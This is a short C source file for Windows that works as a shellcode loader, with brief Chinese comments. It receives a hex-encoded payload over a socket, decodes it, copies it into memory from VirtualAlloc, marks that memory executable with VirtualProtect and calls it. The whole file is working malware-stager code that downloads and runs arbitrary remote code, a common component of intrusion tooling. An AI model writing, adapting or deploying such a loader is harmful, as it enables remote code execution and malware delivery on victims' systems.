#include <stdio.h>
#include <Windows.h>
#include "sockets.h"


int main(int argc, char* argv[]) {
    unsigned int char_in_hex;
    LPSTR  shellcode = NULL;
 //  char* shellcode = argv[1];//从参数读取HEX字符串
    unsigned int iterations = RecvData(&shellcode);
    

    unsigned int memory_allocation = iterations / 2;


    for (unsigned int i = 0; i < iterations / 2; i++) { //减小开销
        sscanf_s(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }


    void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

    (*(void (*)()) exec)();

    return 0;
}